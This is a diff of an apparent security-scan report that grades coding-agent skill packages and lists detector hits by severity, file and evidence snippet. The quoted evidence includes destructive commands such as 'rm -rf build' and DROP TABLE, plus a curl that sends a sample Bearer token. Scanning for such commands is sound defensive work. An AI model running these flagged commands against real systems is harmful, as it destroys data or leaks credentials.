+> Review a coding-agent session and turn its failures and waste into ranked fixes to the agent's environment. Use when a session went slow or wrong, after a messy agent run, or to tune CLAUDE.md or AGEN
+
+| Severity | Detector | Where | Context | Evidence |
+| --- | --- | --- | --- | --- |
+| **high** | `destructive` | `assets/sample_action_items.json:34` | quote | `"evidence": "calls #15-#16: rm -rf build denied twice, retried unchanged",` |
+| **medium** | `destructive` | `references/fix-placement-and-steering-style.md:49` | inline-code | `- **State the positive target.** "Use `make clean` to remove build output" steers better than "Do not run `rm ` |
+
 ### B · 80/100 · `sql-database-assistant`
 
 `engineering/sql-database-assistant` — tier 3 (exec)
 
-> This skill should be used when the user asks to "optimize SQL queries", "explore database schemas", "generate migration SQL", "analyze query performance", or "document database structure".
+> Review SQL queries for index and scan problems, document schemas from DDL, and generate migrations with rollback and destructive-change flags. Use when tuning a query, documenting a schema, or diffing
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
-| **high** | `destructive` | `scripts/migration_generator.py:6` | plain | `and DROP TABLE statements to migrate from one schema to another.` |
-| **high** | `destructive` | `SKILL.md:91` | plain | `\| Dropped tables \| DROP TABLE for removed tables \|` |
+| **high** | `destructive` | `scripts/migration_generator.py:6` | plain | `and DROP TABLE statements to migrate from one schema to another, with a DOWN script.` |
+
+### B · 80/100 · `synthetic-buyer-panel`
+
+`research-ops/synthetic-buyer-panel` — tier 3 (exec)
+
+> Simulated buyer panel: deal reproducible persona cards, run one agent per buyer, tally buy rates, objections and price corridors. Use when asking "would people buy this", pre-testing a pitch, or findi
+
+| Severity | Detector | Where | Context | Evidence |
+| --- | --- | --- | --- | --- |
+| **high** | `persistence` | `scripts/panel_deal.py:231` | plain | `profile = load(args.profile)` |
+
+### B · 84/100 · `pr-description-writer`
+
+`engineering/pr-description-writer` — tier 3 (exec)
+
+> Write PR descriptions with evidence, verification steps and a one-way/two-way merge-risk call. Use when opening a PR, when asked to write or fix a PR body, or when checking a description before reques
+
+| Severity | Detector | Where | Context | Evidence |
+| --- | --- | --- | --- | --- |
+| **medium** | `network-egress` | `assets/sample_pr_body_flawed.md:13` | plain | `curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0In0.abc123def456ghi789" https://staging.ex` |
+| **medium** | `destructive` | `references/merge-risk-classification.md:48` | inline-code | `\| `DROP TABLE` / `DROP COLUMN` / `drop_column(...)` \| Data is gone \|` |
+| **medium** | `network-egress` | `references/pr-body-anatomy.md:67` | plain | `\| 3 \| Command or log output from a real run (CLI, curl, migration plan, `EXPLAIN`) \| Backend, data, infra \|` |
+| **medium** | `network-egress` | `SKILL.md:178` | plain | `\| Backend behaviour \| Command output (curl, CLI) from a real run \|` |
 
 ### B · 86/100 · `monorepo-navigator`
 
@@ -442,19 +558,21 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 | **low** | `dotenv-access` | `references/tooling-and-configuration.md:63` | fence | `"globalDependencies": ["**/.env.*local"],` |
 | **low** | `unpinned-install` | `references/tooling-and-configuration.md:159` | fence | `pnpm add zod --filter @repo/api` |
 
-### B · 86/100 · `senior-frontend`
+### B · 86/100 · `saas-scaffolder`
 
-`engineering/senior-frontend` — tier 3 (exec)
+`engineering/saas-scaffolder` — tier 3 (exec)
 
-> Frontend development for React, Next.js, TypeScript, and Tailwind CSS. Use when building React components, optimizing Next.js performance, analyzing bundle sizes, scaffolding projects, implementing ac
+> Lays down a Next.js SaaS skeleton (provider-specific deps, env, Drizzle tenancy schema, middleware) and guides auth, billing and tenant isolation. Use when starting a SaaS, subscription app or multi-t
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
-| **medium** | `network-egress` | `references/code-patterns.md:67` | fence | `fetch(url).then(r => r.json()).then(setData).finally(() => setLoading(false));` |
-| **medium** | `network-egress` | `references/frontend_best_practices.md:798` | fence | `const response = await fetch('https://api.example.com/data', {` |
-| **medium** | `network-egress` | `references/nextjs_optimization_guide.md:374` | fence | `fetch('https://api.example.com/data');` |
-| **low** | `unpinned-install` | `references/nextjs_optimization_guide.md:441` | fence | `npm install @next/bundle-analyzer` |
-| **low** | `dotenv-access` | `scripts/frontend_scaffolder.py:798` | plain | `.env` |
+| **medium** | `network-egress` | `references/auth-billing-and-tenancy.md:3` | plain | `Read this when wiring up NextAuth, building the Stripe checkout/webhook/portal flow, protecting routes with mi` |
+| **medium** | `network-egress` | `references/workflow-and-quality.md:40` | plain | `19. Implement webhook handler with signature verification` |
+| **medium** | `network-egress` | `scripts/saas_scaffolder.py:126` | quote | `("app/api/webhooks", f"{REF_AUTH} (Webhook Handler)"),` |
+| **medium** | `network-egress` | `SKILL.md:54` | plain | `5. Done when: `npm run build` passes, no `STUB generated` files remain, a test checkout updates the subscripti` |
+| **low** | `dotenv-access` | `references/project-structure-and-schema.md:80` | fence | `├── .env.example` |
+| **low** | `dotenv-access` | `scripts/saas_scaffolder.py:5` | plain | `a provider-filtered .env.example, a Drizzle schema shaped by --tenancy, configs and` |
+| **low** | `unpinned-install` | `scripts/saas_scaffolder.py:293` | quote | `print("next/react/tailwind use ^ ranges; other deps use npm tags. Run npm install once and commit the lockfile` |
 
 ### B · 86/100 · `senior-fullstack`
 
@@ -464,12 +582,23 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
-| **medium** | `network-egress` | `scripts/project_scaffolder.py:471` | plain | `const res = await fetch(`${baseUrl}${endpoint}`, {` |
+| **medium** | `network-egress` | `scripts/project_scaffolder.py:468` | plain | `const res = await fetch(`${baseUrl}${endpoint}`, {` |
 | **low** | `dotenv-access` | `references/development_workflows.md:99` | fence | `# .env.local (development)` |
 | **low** | `dotenv-access` | `references/tooling-workflows-and-quality.md:158` | fence | `cp .env.example .env.local` |
 | **low** | `dotenv-access` | `scripts/code_quality_analyzer.py:31` | quote | `CONFIG_EXTENSIONS = {".json", ".yaml", ".yml", ".toml", ".env"}` |
-| **low** | `dotenv-access` | `scripts/project_scaffolder.py:36` | quote | `".env.example", ".gitignore", "README.md"]` |
-| **low** | `unpinned-install` | `scripts/project_scaffolder.py:661` | plain | `RUN npm install COPY . .` |
+| **low** | `dotenv-access` | `scripts/project_scaffolder.py:36` | quote | `"next.config.js", ".env.example", ".gitignore", "README.md"]` |
+| **low** | `unpinned-install` | `scripts/project_scaffolder.py:666` | plain | `RUN npm install COPY . .` |
+
+### B · 89/100 · `browser-automation`
+
+`engineering/browser-automation` — tier 3 (exec)
+
+> Generates polite, rate-limited scraper and form-submission scripts (requests, no JS) and audits automation code for blocking and overload risks. Use when writing a permitted scraper, scripting a form 
+
+| Severity | Detector | Where | Context | Evidence |
+| --- | --- | --- | --- | --- |
+| **medium** | `network-egress` | `assets/sample_bare_scraper.py:15` | plain | `html = requests.get(f"https://example.com/catalog?page={page}", headers=HEADERS).text` |
+| **low** | `unpinned-install` | `scripts/scraping_toolkit.py:146` | plain | `NOTE: This is a template. Install requests library: pip install requests` |
 
 ### B · 89/100 · `performance-profiler`
 
@@ -482,20 +611,6 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 | **medium** | `privilege-escalation` | `references/load-testing-and-methodology.md:151` | inline-code | `\| `py-spy` cannot attach to running process \| Insufficient permissions or SIP (System Integrity Protection) on` |
 | **low** | `unpinned-install` | `references/cpu-and-memory-profiling.md:99` | fence | `pip install memray` |
 
-### B · 89/100 · `saas-scaffolder`
-
-`engineering/saas-scaffolder` — tier 3 (exec)
-
-> Generate SaaS boilerplate with auth, database schemas, Stripe billing, multi-tenancy, API routes, and dashboard UI on a Next.js/TypeScript/Tailwind stack. Use when starting a new SaaS product, subscri
-
-| Severity | Detector | Where | Context | Evidence |
-| --- | --- | --- | --- | --- |
-| **medium** | `network-egress` | `references/auth-billing-and-tenancy.md:3` | plain | `Read this when wiring up NextAuth, building the Stripe checkout/webhook/portal flow, protecting routes with mi` |
-| **medium** | `network-egress` | `references/workflow-and-quality.md:40` | plain | `19. Implement webhook handler with signature verification` |
-| **medium** | `network-egress` | `SKILL.md:32` | plain | `- **Stripe billing** — checkout session, customer portal, and signature-verified webhook handler keeping subsc` |
-| **low** | `dotenv-access` | `references/project-structure-and-schema.md:80` | fence | `├── .env.example` |
-| **low** | `dotenv-access` | `scripts/saas_scaffolder.py:218` | quote | `".env.example": None,` |
-
 ### B · 89/100 · `senior-computer-vision`
 
 `engineering/senior-computer-vision` — tier 3 (exec)
@@ -505,7 +620,7 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
 | **medium** | `ip-literal-url` | `references/production_vision_systems.md:754` | fence | `inference_address=http://0.0.0.0:8080` |
-| **low** | `unpinned-install` | `scripts/inference_optimizer.py:431` | plain | `'onnxruntime': f'pip install onnxruntime-gpu',` |
+| **low** | `unpinned-install` | `scripts/inference_optimizer.py:435` | plain | `'onnxruntime': f'pip install onnxruntime-gpu',` |
 
 ### B · 89/100 · `senior-qa`
 
